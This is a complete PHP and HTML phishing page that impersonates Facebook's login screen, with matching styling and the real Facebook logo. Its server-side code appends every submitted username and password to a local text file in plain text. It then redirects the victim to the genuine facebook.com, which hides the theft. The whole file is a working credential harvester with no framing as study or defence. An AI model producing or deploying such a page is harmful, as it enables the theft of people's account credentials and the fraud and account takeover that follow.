<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $data = "username: " . $_POST['username'] . " | password: " . $_POST['password'] . "\n";
    file_put_contents("usernames.txt", $data, FILE_APPEND);
    header("Location: https://www.facebook.com");
    exit;
}
?>
<!DOCTYPE html>
<html>
<head><title>Facebook – log in or sign up</title><meta charset="UTF-8"></head>
<body style="background: #f0f2f5; font-family: Arial, sans-serif; text-align: center; margin-top: 120px;">
<div style="background: white; width: 400px; margin: auto; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
<img src="https://www.facebook.com/images/fb_icon_325x325.png" width="60"><br>
<h2>Log into Facebook</h2>
<form method="post">
<input type="text" name="username" placeholder="Email or phone number" style="width: 90%; padding: 12px; margin: 8px; border: 1px solid #dddfe2; border-radius: 6px;" required><br>
<input type="password" name="password" placeholder="Password" style="width: 90%; padding: 12px; margin: 8px; border: 1px solid #dddfe2; border-radius: 6px;" required><br>
<button type="submit" style="background: #1877f2; color: white; width: 95%; padding: 12px; border: none; border-radius: 6px; font-size: 18px;">Log In</button>
</form>
</div>
</body>
</html>
